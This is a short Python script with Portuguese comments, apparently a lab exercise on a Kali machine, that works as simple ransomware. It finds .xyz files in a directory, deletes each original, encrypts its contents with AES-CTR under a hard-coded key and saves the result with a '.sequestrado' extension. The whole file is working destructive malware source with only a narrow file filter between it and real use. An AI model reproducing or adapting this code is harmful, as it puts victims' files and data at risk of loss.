import os
import pyaes

# Diretório onde os arquivos estão localizados
directory = '/home/kali/ransomware'

# Obter todos os arquivos no diretório com extensão .xyz
files_to_encrypt = [f for f in os.listdir(directory) if f.endswith('.xyz')]

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Processar cada arquivo .xyz
for file_name in files_to_encrypt:
    # Abrir o arquivo para leitura
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Criptografar o conteúdo
    crypto_data = aes.encrypt(file_data)

    # Criar um novo nome para o arquivo criptografado
    new_file_name = file_name + ".sequestrado"
    
    # Salvar o arquivo criptografado
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    print(f'Arquivo {file_name} criptografado com sucesso!')

